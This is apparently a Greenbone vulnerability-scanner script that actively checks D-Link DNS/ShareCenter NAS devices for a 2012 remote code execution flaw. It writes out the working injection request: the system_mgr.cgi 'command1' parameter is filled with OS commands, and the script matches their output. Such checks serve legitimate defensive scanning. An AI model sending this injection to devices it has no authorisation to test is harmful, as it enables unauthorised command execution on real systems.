# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

# nb: Running against all DNS devices just to be sure as the vendor is known to usually have a wide
# range of affected devices even not actually mentioned as affected.
CPE_PREFIX = "cpe:/o:dlink:dns";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103699");
  script_version("2025-06-16T05:41:07+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-06-16 05:41:07 +0000 (Mon, 16 Jun 2025)");
  script_tag(name:"creation_date", value:"2013-04-18 12:07:07 +0200 (Thu, 18 Apr 2013)");
  script_name("D-Link DNS/ShareCenter Products Multiple RCE Vulnerabilities (Feb 2012) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_dlink_dns_http_detect.nasl");
  script_mandatory_keys("d-link/dns/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://web.archive.org/web/20160806205757/http://blog.emaze.net/2012/02/advisory-information-title.html");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210214004057/http://www.securityfocus.com/bid/51918");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121071529/http://www.securityfocus.com/archive/1/521532");

  script_tag(name:"summary", value:"D-Link DNS/ShareCenter products are prone to multiple remote
  code execution (RCE) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary
  code in the context of the affected application. Failed exploit attempts may result in a denial-
  of-service condition.");

  script_tag(name:"affected", value:"D-Link DNS-320 and DNS-325 ShareCenter devices. Other models
  might be affected as well.");

  script_tag(name:"solution", value:"- D-Link DNS-320 and DNS-325 devices: Updates are available.
  Please see the references for more information.

  - Other models: Please contact the vendor for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

cpe = infos["cpe"];
port = infos["port"];

if (!get_app_location(cpe: cpe, port: port, nofork: TRUE))
  exit(0);

cmds = exploit_commands("linux");

foreach pattern (keys(cmds)) {
  cmd = cmds[pattern];

  url = "/cgi-bin/system_mgr.cgi?cmd=cgi_sms_test&command1=" + cmd;
  if(http_vuln_check(port:port, url:url, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
